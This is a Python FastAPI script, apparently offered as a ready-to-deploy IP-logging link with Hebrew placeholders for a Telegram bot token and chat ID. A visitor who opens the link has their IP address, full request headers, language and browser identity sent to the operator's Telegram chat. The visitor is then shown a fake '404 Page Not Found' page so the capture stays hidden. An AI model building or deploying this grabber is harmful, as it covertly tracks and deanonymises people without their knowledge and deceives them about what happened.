from fastapi import FastAPI, Request, HTTPException
from starlette.responses import HTMLResponse, RedirectResponse
import httpx
import asyncio
import uvicorn

bot_token = "הוסף את הטוקן שלך"
chat_owner = "החלף לטלגרם id שלך"

app = FastAPI()

# Set of IP addresses that have sent data
sent_ips = set()

# List of allowed paths
allowed_paths = {"/"}


async def send_telegram(data):
    url_telegram = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url_telegram, data={"chat_id": chat_owner, "text": data})
            response.raise_for_status()
            return response.status_code == 200
        except (httpx.TimeoutException, httpx.HTTPStatusError, httpx.ResponseNotRead):
            print("Failed to send Telegram message.")
            return False


@app.get("/")
async def root(request: Request):
    ip = request.client.host

    # Check if IP address has already sent data
    if ip in sent_ips:
        raise HTTPException(status_code=404, detail="Page not found")

    # Print request information
    data = f"📨 כתובת IP של הבקשה: {ip}\n" \
           f"🗓️ כותרות הבקשה: {request.headers}\n" \
           f"‍💻 שיטת הבקשה: {request.method}\n" \
           f"🌐 שפת הבקשה: {request.headers.get('accept-language')}\n" \
           f"📱 סוג דפדפן: {request.headers.get('user-agent')}"

    # Send request information to Telegram
    asyncio.create_task(send_telegram(data))

    # Add IP address to the sent_ips set
    sent_ips.add(ip)

    # Return 404 page
    raise HTTPException(status_code=404, detail="Page not found")


@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    return HTMLResponse(content="""
        <html>
        <head>
            <title>404 - Page Not Found</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                }

                .container {
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    text-align: center;
                }

                h1 {
                    font-size: 36px;
                    margin-bottom: 20px;
                }

                p {
                    font-size: 18px;
                    margin-bottom: 20px;
                }

                a {
                    color: #337ab7;
                    text-decoration: none;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>404 - Page Not Found</h1>
                <p>The page you are looking for does not exist.</p>
                <p><a href="https://google.com">Go to the main page</a></p>
            </div>
        </body>
        </html>
    """, status_code=404)


@app.middleware("http")
async def check_allowed_path(request: Request, call_next):
    if request.url.path not in allowed_paths:
        return RedirectResponse(url="/")
    return await call_next(request)

if __name__ == "__main__":
    uvicorn.run(app)
